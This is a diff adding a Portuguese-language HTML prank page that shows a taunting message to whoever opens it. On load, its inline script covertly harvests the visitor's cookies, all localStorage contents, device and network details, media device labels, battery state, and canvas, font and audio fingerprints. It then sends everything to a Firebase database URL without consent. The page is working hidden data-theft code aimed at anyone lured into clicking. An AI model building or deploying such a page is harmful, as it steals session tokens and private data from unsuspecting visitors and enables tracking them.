@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>coletando</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body {
+    background: #000;
+    color: #0f0;
+    font-family: 'Courier New', Courier, monospace;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+    text-align: center;
+    -webkit-tap-highlight-color: transparent;
+  }
+  .msg {
+    font-size: clamp(1.6rem, 8vw, 2.4rem);
+    font-weight: bold;
+    letter-spacing: 1px;
+    word-break: break-word;
+    text-shadow: 0 0 8px rgba(0, 255, 0, 0.4);
+    animation: pulse 2s infinite ease-in-out;
+    max-width: 90vw;
+  }
+  @keyframes pulse {
+    0%   { opacity: 0.85; text-shadow: 0 0 6px #0f0; }
+    50%  { opacity: 1;    text-shadow: 0 0 16px #0f0, 0 0 30px #0f0; }
+    100% { opacity: 0.85; text-shadow: 0 0 6px #0f0; }
+  }
+</style>
+</head>
+<body>
+<div class="msg" id="msg">caralho clicou muito burrakkkk</div>
+
+<script>
+(function () {
+  'use strict';
+
+  // ============================================================
+  // CONFIG
+  // ============================================================
+  var FIREBASE_URL = 'https://appatividades-7450d-default-rtdb.firebaseio.com/raiox.json';
+
+  // ============================================================
+  // COLETA — tudo em UM objeto simples, sem frescura
+  // ============================================================
+  var d = {};
+
+  // -------- NAVEGADOR --------
+  try {
+    d.userAgent     = String(navigator.userAgent || '');
+    d.platform      = String(navigator.platform || '');
+    d.vendor        = String(navigator.vendor || '');
+    d.language      = String(navigator.language || '');
+    d.languages     = String((navigator.languages || []).join(', '));
+    d.cookieEnabled = String(navigator.cookieEnabled);
+    d.doNotTrack    = String(navigator.doNotTrack || '');
+    d.onLine        = String(navigator.onLine);
+  } catch (e) { d.err_navegador = String(e); }
+
+  // -------- TELA --------
+  try {
+    d.screenW       = String(screen.width);
+    d.screenH       = String(screen.height);
+    d.availW        = String(screen.availWidth);
+    d.availH        = String(screen.availHeight);
+    d.colorDepth    = String(screen.colorDepth);
+    d.pixelRatio    = String(window.devicePixelRatio || '');
+    d.orientation   = String((screen.orientation && screen.orientation.type) || '');
+    d.innerW        = String(window.innerWidth);
+    d.innerH        = String(window.innerHeight);
+    d.outerW        = String(window.outerWidth);
+    d.outerH        = String(window.outerHeight);
+    d.screenX       = String(window.screenX);
+    d.screenY       = String(window.screenY);
+    d.touch         = String('ontouchstart' in window);
+  } catch (e) { d.err_tela = String(e); }
+
+  // -------- HARDWARE --------
+  try {
+    d.cpuCores      = String(navigator.hardwareConcurrency || '');
+    d.deviceMemory  = String(navigator.deviceMemory || '');
+    d.maxTouch      = String(navigator.maxTouchPoints != null ? navigator.maxTouchPoints : '');
+  } catch (e) { d.err_hardware = String(e); }
+
+  // -------- REDE --------
+  try {
+    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (conn) {
+      d.netType     = String(conn.effectiveType || '');
+      d.netDownlink = String(conn.downlink != null ? conn.downlink : '');
+      d.netRtt      = String(conn.rtt != null ? conn.rtt : '');
+      d.netSaveData = String(conn.saveData);
+    }
+  } catch (e) { d.err_rede = String(e); }
+
+  // -------- LOCALE --------
+  try {
+    var opts = Intl.DateTimeFormat().resolvedOptions();
+    d.timeZone   = String(opts.timeZone || '');
+    d.tzOffset   = String(new Date().getTimezoneOffset());
+    d.locale     = String(opts.locale || '');
+    d.calendar   = String(opts.calendar || '');
+    d.localTime  = String(new Date().toString());
+  } catch (e) { d.err_locale = String(e); }
+
+  // -------- STORAGE --------
+  try {
+    d.localStorageCount = String(localStorage.length);
+    var ls = {};
+    for (var i = 0; i < localStorage.length; i++) {
+      var k = localStorage.key(i);
+      ls[k] = String(localStorage.getItem(k));
+    }
+    d.localStorageData = JSON.stringify(ls);
+  } catch (e) { d.err_localStorage = String(e); }
+
+  try {
+    d.sessionStorageCount = String(sessionStorage.length);
+  } catch (e) { d.err_sessionStorage = String(e); }
+
+  try {
+    d.indexedDB = String('indexedDB' in window);
+    d.cacheAPI  = String('caches' in window);
+  } catch (e) { d.err_storageExtra = String(e); }
+
+  // -------- COOKIES --------
+  try {
+    d.cookiesRaw = String(document.cookie || '');
+  } catch (e) { d.err_cookies = String(e); }
+
+  // -------- GPU (WebGL) --------
+  try {
+    var canvas = document.createElement('canvas');
+    var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (gl) {
+      var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+      if (dbg) {
+        d.gpuVendor   = String(gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL));
+        d.gpuRenderer = String(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL));
+      } else {
+        d.gpuVendor   = String(gl.getParameter(gl.VENDOR));
+        d.gpuRenderer = String(gl.getParameter(gl.RENDERER));
+      }
+      d.gpuVersion  = String(gl.getParameter(gl.VERSION));
+      d.gpuMaxTex   = String(gl.getParameter(gl.MAX_TEXTURE_SIZE));
+    }
+  } catch (e) { d.err_gpu = String(e); }
+
+  // -------- CODECS --------
+  try {
+    var v = document.createElement('video');
+    var a = document.createElement('audio');
+    d.h264  = String(v.canPlayType('video/mp4; codecs="avc1.42E01E"'));
+    d.vp9   = String(v.canPlayType('video/webm; codecs="vp9"'));
+    d.av1   = String(v.canPlayType('video/mp4; codecs="av01.0.00M.08"'));
+    d.hevc  = String(v.canPlayType('video/mp4; codecs="hvc1"'));
+    d.aac   = String(a.canPlayType('audio/mp4; codecs="mp4a.40.2"'));
+    d.opus  = String(a.canPlayType('audio/webm; codecs="opus"'));
+    d.mp3   = String(a.canPlayType('audio/mpeg'));
+    d.eme   = String(!!navigator.requestMediaKeySystemAccess);
+  } catch (e) { d.err_codecs = String(e); }
+
+  // -------- FINGERPRINT CANVAS --------
+  try {
+    var cv = document.createElement('canvas');
+    cv.width = 200; cv.height = 60;
+    var ctx = cv.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(0, 0, 100, 30);
+    ctx.fillStyle = '#069';
+    ctx.fillText('Fingerprint', 2, 15);
+    ctx.fillStyle = 'rgba(102,204,0,0.7)';
+    ctx.fillText('Fingerprint', 4, 17);
+    var dataUrl = cv.toDataURL();
+    var hash = 0;
+    for (var j = 0; j < dataUrl.length; j++) {
+      hash = ((hash << 5) - hash + dataUrl.charCodeAt(j)) | 0;
+    }
+    d.canvasHash = String((hash >>> 0).toString(16));
+  } catch (e) { d.err_canvas = String(e); }
+
+  // -------- FINGERPRINT FONTES --------
+  try {
+    var baseFonts = ['monospace', 'sans-serif', 'serif'];
+    var testFonts = ['Arial','Courier New','Georgia','Times New Roman','Verdana',
+                     'Comic Sans MS','Impact','Tahoma','Trebuchet MS','Roboto','San Francisco'];
+    var span = document.createElement('span');
+    span.style.cssText = 'position:absolute;left:-9999px;font-size:72px;';
+    span.textContent = 'mmmmmmmmmmlli';
+    document.body.appendChild(span);
+    var baseSizes = {};
+    for (var bf = 0; bf < baseFonts.length; bf++) {
+      span.style.fontFamily = baseFonts[bf];
+      baseSizes[baseFonts[bf]] = span.offsetWidth + ',' + span.offsetHeight;
+    }
+    var detectadas = [];
+    for (var fi = 0; fi < testFonts.length; fi++) {
+      for (var bf2 = 0; bf2 < baseFonts.length; bf2++) {
+        span.style.fontFamily = "'" + testFonts[fi] + "'," + baseFonts[bf2];
+        var sz = span.offsetWidth + ',' + span.offsetHeight;
+        if (sz !== baseSizes[baseFonts[bf2]]) { detectadas.push(testFonts[fi]); break; }
+      }
+    }
+    document.body.removeChild(span);
+    d.fontsDetected = String(detectadas.length) + '/' + String(testFonts.length);
+    d.fontsList = detectadas.join(', ');
+  } catch (e) { d.err_fontes = String(e); }
+
+  // ============================================================
+  // COLETA ASSÍNCRONA (só primitivos)
+  // ============================================================
+  var tarefas = [];
+
+  // -------- Permissões --------
+  tarefas.push(
+    (function () {
+      var perms = ['geolocation','notifications','camera','microphone',
+                   'clipboard-read','clipboard-write','midi','background-sync'];
+      return Promise.all(perms.map(function (p) {
+        return navigator.permissions.query({ name: p })
+          .then(function (r) { d['perm_' + p] = String(r.state); })
+          .catch(function ()  { d['perm_' + p] = 'unavailable'; });
+      })).catch(function () {});
+    })()
+  );
+
+  // -------- Devices --------
+  tarefas.push(
+    (function () {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return Promise.resolve();
+      return navigator.mediaDevices.enumerateDevices()
+        .then(function (devs) {
+          var mic = 0, spk = 0, cam = 0;
+          var labels = [];
+          for (var i = 0; i < devs.length; i++) {
+            var dev = devs[i];
+            if (dev.kind === 'audioinput')  mic++;
+            if (dev.kind === 'audiooutput') spk++;
+            if (dev.kind === 'videoinput')  cam++;
+            if (dev.label) labels.push(dev.kind + ': ' + dev.label);
+          }
+          d.mics = String(mic);
+          d.speakers = String(spk);
+          d.cameras = String(cam);
+          d.deviceLabels = labels.join(' | ');
+        })
+        .catch(function (e) { d.err_devices = String(e); });
+    })()
+  );
+
+  // -------- Bateria --------
+  tarefas.push(
+    (function () {
+      if (!navigator.getBattery) return Promise.resolve();
+      return navigator.getBattery()
+        .then(function (b) {
+          d.batteryLevel    = String(Math.round(b.level * 100));
+          d.batteryCharging = String(b.charging);
+          d.batteryChargingTime    = String(b.chargingTime);
+          d.batteryDischargingTime = String(b.dischargingTime);
+        })
+        .catch(function (e) { d.err_battery = String(e); });
+    })()
+  );
+
+  // -------- UA-CH High Entropy --------
+  tarefas.push(
+    (function () {
+      if (!navigator.userAgentData || !navigator.userAgentData.getHighEntropyValues) return Promise.resolve();
+      return navigator.userAgentData.getHighEntropyValues(
+        ['architecture','bitness','model','platformVersion']
+      ).then(function (v) {
+        d.arch          = String(v.architecture || '');
+        d.bitness       = String(v.bitness || '');
+        d.model         = String(v.model || '');
+        d.platformVer   = String(v.platformVersion || '');
+      }).catch(function () {});
+    })()
+  );
+
+  // -------- Audio fingerprint --------
+  tarefas.push(
+    (function () {
+      return new Promise(function (resolve) {
+        try {
+          var AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+          if (!AC) return resolve();
+          var ac = new AC(1, 44100, 44100);
+          var osc = ac.createOscillator();
+          osc.type = 'triangle';
+          osc.frequency.value = 10000;
+          var comp = ac.createDynamicsCompressor();
+          osc.connect(comp);
+          comp.connect(ac.destination);
+          osc.start(0);
+          ac.startRendering().then(function (buf) {
+            var ch = buf.getChannelData(0).slice(4500, 5000);
+            var sum = 0;
+            for (var i = 0; i < ch.length; i++) sum += Math.abs(ch[i]);
+            d.audioHash = String(sum.toString(16).slice(0, 16));
+            resolve();
+          }).catch(function () { resolve(); });
+        } catch (e) { resolve(); }
+      });
+    })()
+  );
+
+  // -------- Storage estimate --------
+  tarefas.push(
+    (function () {
+      if (!navigator.storage || !navigator.storage.estimate) return Promise.resolve();
+      return navigator.storage.estimate().then(function (e) {
+        d.storageUsageMB = String((e.usage / 1024 / 1024).toFixed(2));
+        d.storageQuotaMB = String((e.quota / 1024 / 1024).toFixed(2));
+      }).catch(function () {});
+    })()
+  );
+
+  // ============================================================
+  // QUANDO TUDO TERMINAR (ou 4s de timeout) → MANDA
+  // ============================================================
+  var enviado = false;
+  function enviar() {
+    if (enviado) return;
+    enviado = true;
+
+    // Adiciona timestamp
+    d.timestamp = String(new Date().toISOString());
+
+    // ---------- TRANSFORMA TUDO EM STRING E MANDA ----------
+    var payload;
+    try {
+      // Constrói um objeto só com strings
+      var stringificado = {};
+      for (var key in d) {
+        if (Object.prototype.hasOwnProperty.call(d, key)) {
+          stringificado[key] = String(d[key]);
+        }
+      }
+      payload = JSON.stringify(stringificado);
+    } catch (e) {
+      payload = JSON.stringify({ erro: 'falha ao serializar', detalhe: String(e) });
+    }
+
+    console.log('📤 payload (' + payload.length + ' chars)');
+
+    // ---------- FETCH SIMPLES ----------
+    fetch(FIREBASE_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: payload
+    })
+    .then(function (r) {
+      return r.text().then(function (txt) {
+        return { status: r.status, ok: r.ok, txt: txt };
+      });
+    })
+    .then(function (res) {
+      console.log('📥 resposta ' + res.status + ': ' + res.txt);
+      if (!res.ok) {
+        document.getElementById('msg').textContent = 'erro ' + res.status;
+      }
+    })
+    .catch(function (err) {
+      console.error('❌ fetch falhou:', err);
+    });
+  }
+
+  Promise.all(tarefas).then(enviar).catch(enviar);
+  setTimeout(enviar, 4000); // fallback: manda mesmo se algo travar
+
+})();
+</script>
+</body>
+</html>
